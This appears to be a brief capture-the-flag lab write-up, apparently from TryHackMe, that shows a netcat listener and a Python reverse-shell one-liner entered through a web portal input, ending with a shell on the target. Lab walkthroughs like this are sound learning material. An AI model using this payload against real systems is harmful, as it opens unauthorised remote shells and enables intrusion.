Setting up a listener on my machine:
```bash
nc -lvnp 4444
```

Finding my THM network IP:
```bash
ip a
# 192.168.142.170
```

Launching the reverse shell from the portal input:
```bash
python3 -c 'import pty,socket,os;s=socket.socket();s.connect(("192.168.142.170",4444));[os.dup2(s.fileno(),i)for i in range(3)];pty.spawn("/bin/bash")'
```

Reverse shell obtained successfully.